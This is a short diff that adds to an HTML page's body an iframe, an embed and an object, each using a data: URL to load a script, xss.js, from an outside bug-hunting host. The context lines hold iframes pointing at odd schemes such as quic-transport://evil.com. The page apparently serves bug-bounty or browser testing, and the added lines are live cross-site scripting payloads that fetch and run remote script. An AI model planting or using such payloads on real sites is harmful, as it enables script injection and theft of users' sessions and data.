@@ -5,6 +5,13 @@
 </head>
 <body>
  
+
+<iframe src="data:text/html,<script src='http://bughunt1307.herokuapp.com/xss.js'></script>"></iframe>
+<embed type="text/html" src="data:text/html,<script src='http://bughunt1307.herokuapp.com/xss.js'></script>" width="250" height="200">
+<object type="text/html" data="data:text/html,<script src='http://bughunt1307.herokuapp.com/xss.js'></script>" width="250" height="200">
+</object>
+	       
+	
 <iframe src="quic-transport://evil.com/"></iframe>
 
 ​<iframe src="dat://google.com"></iframe>
